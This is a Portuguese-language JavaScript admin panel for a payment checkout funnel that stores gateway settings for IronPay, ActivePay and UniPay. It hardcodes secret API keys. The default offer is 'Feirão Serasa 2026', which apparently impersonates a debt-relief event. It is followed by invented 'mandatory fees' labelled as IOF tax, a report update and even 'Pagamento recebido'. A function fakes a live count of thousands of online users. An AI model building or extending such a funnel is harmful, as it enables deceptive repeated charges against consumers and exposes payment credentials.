// ===== PAINEL DE GATEWAYS =====
// Salva config no localStorage para o checkout ler em tempo real

const STORAGE_KEY = 'gateway_config';

// Credenciais padrão (pré-preenchidas)
const DEFAULT_CREDENTIALS = {
    ironpay: {
        token: 'XCntKV6WvEts5wHqYucZh257gUgmrSrn34ZxLXOlkyvWM6Ju9d50QRvZMsDE',
        offer_hash: '',
        product_hash: ''
    },
    activepay: {
        public_key: 'pk_nSX9oYwUV3Nmzoc4Z-Tlfrqr7ESXGnbBHD6O-AX8HGDxUukX',
        secret_key: 'sk_Vc7sIxgI8PugjFE0v8jrDSp3SJT_9MK3BNWKl1nEIFqDvCb6'
    },
    unipay: {
        public_key: 'pk_d5eeee4771f9ff6e5f2ac0b6b6de0aedf773119f',
        secret_key: 'sk_bfed0718725a89a087b90cb99823799ea1fa03d3'
    }
};

// Carrega configuração salva ou usa padrão
function loadConfig() {
    try {
        const saved = localStorage.getItem(STORAGE_KEY);
        if (saved) return JSON.parse(saved);
    } catch (e) { }
    return null;
}

function saveConfig(config) {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
}

// Preenche campos com valores salvos ou padrão
function populateFields() {
    const config = loadConfig();

    // IronPay
    const ipToken = config?.gateways?.ironpay?.token || DEFAULT_CREDENTIALS.ironpay.token;
    const ipOffer = config?.gateways?.ironpay?.offer_hash || DEFAULT_CREDENTIALS.ironpay.offer_hash;
    const ipProduct = config?.gateways?.ironpay?.product_hash || DEFAULT_CREDENTIALS.ironpay.product_hash;
    document.getElementById('ironpay-token').value = ipToken;
    document.getElementById('ironpay-offer').value = ipOffer;
    document.getElementById('ironpay-product').value = ipProduct;

    // ActivePay
    const apPk = config?.gateways?.activepay?.public_key || DEFAULT_CREDENTIALS.activepay.public_key;
    const apSk = config?.gateways?.activepay?.secret_key || DEFAULT_CREDENTIALS.activepay.secret_key;
    document.getElementById('activepay-pk').value = apPk;
    document.getElementById('activepay-sk').value = apSk;

    // UniPay
    const upPk = config?.gateways?.unipay?.public_key || DEFAULT_CREDENTIALS.unipay.public_key;
    const upSk = config?.gateways?.unipay?.secret_key || DEFAULT_CREDENTIALS.unipay.secret_key;
    document.getElementById('unipay-pk').value = upPk;
    document.getElementById('unipay-sk').value = upSk;

    // Produto
    const amount = config?.product?.amount || '98,52';
    const productName = config?.product?.name || 'Feirão Serasa 2026';
    document.getElementById('product-amount').value = amount;
    document.getElementById('product-name').value = productName;

    // Upsell
    const upsellAmount = config?.upsell?.amount || '78,25';
    const upsellName = config?.upsell?.name || 'Pagamento da Taxa Obrigatória';
    document.getElementById('upsell-amount').value = upsellAmount;
    document.getElementById('upsell-name').value = upsellName;

    // IOF
    const iofAmount = config?.iof?.amount || '41,82';
    const iofName = config?.iof?.name || 'Taxa Obrigatória (IOF)';
    document.getElementById('iof-amount').value = iofAmount;
    document.getElementById('iof-name').value = iofName;

    // ICM
    const icmAmount = config?.icm?.amount || '38,50';
    const icmName = config?.icm?.name || 'Pagamento recebido';
    document.getElementById('icm-amount').value = icmAmount;
    document.getElementById('icm-name').value = icmName;

    // iPhone
    const iphoneAmount = config?.iphone?.amount || '62,50';
    const iphoneName = config?.iphone?.name || 'Atualização do Relatório';
    document.getElementById('iphone-amount').value = iphoneAmount;
    document.getElementById('iphone-name').value = iphoneName;

    // Atualizar badge do gateway ativo
    updateActiveBadge(config?.activeGateway);

    // Ativar a tab do gateway salvo
    if (config?.activeGateway) {
        switchTab(config.activeGateway);
    }
}

function updateActiveBadge(gw) {
    const badge = document.getElementById('activeBadge');
    const badgeText = document.getElementById('badgeText');
    const statusText = document.getElementById('statusText');

    const names = {
        ironpay: 'IronPay',
        activepay: 'ActivePay',
        unipay: 'UniPay'
    };

    if (gw && names[gw]) {
        badge.classList.add('show');
        badgeText.textContent = 'Gateway ativo: ' + names[gw];
        statusText.textContent = names[gw] + ' ativo';
    } else {
        badge.classList.remove('show');
        statusText.textContent = 'Nenhum gateway ativo';
    }
}

// Trocar tab
function switchTab(gw) {
    // Tabs
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelector(`.tab[data-gw="${gw}"]`).classList.add('active');

    // Panels
    document.querySelectorAll('.gw-panel').forEach(p => p.classList.remove('active'));
    document.getElementById(`panel-${gw}`).classList.add('active');
}

// Salvar gateway
function saveGateway(gw) {
    const config = loadConfig() || { activeGateway: null, gateways: {}, product: {} };

    config.activeGateway = gw;

    if (!config.gateways) config.gateways = {};

    switch (gw) {
        case 'ironpay':
            config.gateways.ironpay = {
                token: document.getElementById('ironpay-token').value.trim(),
                offer_hash: document.getElementById('ironpay-offer').value.trim(),
                product_hash: document.getElementById('ironpay-product').value.trim()
            };
            break;
        case 'activepay':
            config.gateways.activepay = {
                public_key: document.getElementById('activepay-pk').value.trim(),
                secret_key: document.getElementById('activepay-sk').value.trim()
            };
            break;
        case 'unipay':
            config.gateways.unipay = {
                public_key: document.getElementById('unipay-pk').value.trim(),
                secret_key: document.getElementById('unipay-sk').value.trim()
            };
            break;
    }

    saveConfig(config);
    updateActiveBadge(gw);
    showToast('✅ ' + gw.charAt(0).toUpperCase() + gw.slice(1) + ' ativado com sucesso!');
}

// Salvar config do produto
function saveProductConfig() {
    const config = loadConfig() || { activeGateway: null, gateways: {}, product: {}, upsell: {} };

    config.product = {
        amount: document.getElementById('product-amount').value.trim(),
        name: document.getElementById('product-name').value.trim()
    };

    saveConfig(config);
    showToast('✅ Configuração do produto salva!');
}

// Salvar config do upsell
function saveUpsellConfig() {
    const config = loadConfig() || { activeGateway: null, gateways: {}, product: {}, upsell: {}, iof: {} };

    config.upsell = {
        amount: document.getElementById('upsell-amount').value.trim(),
        name: document.getElementById('upsell-name').value.trim()
    };

    saveConfig(config);
    showToast('✅ Configuração do 1º upsell salva!');
}

// Salvar config do IOF
function saveIofConfig() {
    const config = loadConfig() || { activeGateway: null, gateways: {}, product: {}, upsell: {}, iof: {}, icm: {}, iphone: {} };

    config.iof = {
        amount: document.getElementById('iof-amount').value.trim(),
        name: document.getElementById('iof-name').value.trim()
    };

    saveConfig(config);
    showToast('✅ Configuração do IOF salva!');
}

// Salvar config do ICM
function saveIcmConfig() {
    const config = loadConfig() || { activeGateway: null, gateways: {}, product: {}, upsell: {}, iof: {}, icm: {}, iphone: {} };

    config.icm = {
        amount: document.getElementById('icm-amount').value.trim(),
        name: document.getElementById('icm-name').value.trim()
    };

    saveConfig(config);
    showToast('✅ Configuração do ICM salva!');
}

// Salvar config do iPhone
function saveIphoneConfig() {
    const config = loadConfig() || { activeGateway: null, gateways: {}, product: {}, upsell: {}, iof: {}, icm: {}, iphone: {} };

    config.iphone = {
        amount: document.getElementById('iphone-amount').value.trim(),
        name: document.getElementById('iphone-name').value.trim()
    };

    saveConfig(config);
    showToast('✅ Configuração do iPhone salva!');
}

// Toast
function showToast(msg) {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
}

// Inicializar
document.addEventListener('DOMContentLoaded', () => {
    populateFields();
    simulateOnlineUsers();
});

// Simulador de Pessoas Online no Funil
function simulateOnlineUsers() {
    const countElement = document.getElementById('online-count');
    if (!countElement) return;

    // Número base realista
    let currentUsers = Math.floor(Math.random() * (2800 - 2200 + 1)) + 2200;
    countElement.textContent = currentUsers.toLocaleString('pt-BR');

    // Intervalo aleatório para atualizar (entre 3s e 7s)
    setInterval(() => {
        // Decide se sobe ou desce o número
        const isUp = Math.random() > 0.45; // Leve tendência a subir
        const variation = Math.floor(Math.random() * 15) + 1; // Varia de 1 a 15 pessoas

        if (isUp) {
            currentUsers += variation;
        } else {
            currentUsers -= variation;
        }

        // Limite para não baixar muito nem subir absurdamente
        if (currentUsers < 1500) currentUsers += 50;
        if (currentUsers > 3500) currentUsers -= 50;

        countElement.textContent = currentUsers.toLocaleString('pt-BR');
    }, Math.floor(Math.random() * (7000 - 3000 + 1)) + 3000);
}
